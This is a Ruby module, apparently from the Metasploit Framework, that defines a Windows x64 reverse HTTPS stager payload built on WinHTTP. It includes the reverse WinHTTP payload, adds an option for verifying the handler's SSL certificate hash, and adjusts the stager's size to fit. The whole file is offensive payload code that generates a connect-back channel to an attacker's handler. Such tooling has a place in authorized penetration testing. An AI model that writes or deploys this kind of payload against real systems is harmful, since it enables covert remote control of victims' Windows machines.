# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/x64/reverse_winhttp'
require 'msf/core/payload/windows/verify_ssl'
require 'rex/payloads/meterpreter/uri_checksum'

module Msf

###
#
# Complex payload generation for Windows ARCH_X64 that speak HTTPS using WinHTTP
#
###

module Payload::Windows::ReverseWinHttps_x64

  include Msf::Payload::Windows::ReverseWinHttp_x64
  include Msf::Payload::Windows::VerifySsl

  #
  # Register reverse_winhttps specific options
  #
  def initialize(*args)
    super

    register_advanced_options([
        OptBool.new('StagerVerifySSLCert', [false, 'Whether to verify the SSL certificate hash in the handler', false])
      ], self.class)
  end

  #
  # Generate the first stage
  #
  def generate

    verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                         datastore['HandlerSSLCert'])

    super(
      ssl:              true,
      verify_cert_hash: verify_cert_hash
    )
  end

  def transport_config(opts={})
    transport_config_reverse_https(opts)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    space = super

    # SSL support adds 20 bytes
    space += 20

    # SSL verification adds 120 bytes
    if datastore['StagerVerifySSLCert']
      space += 120
    end

    space
  end

end

end

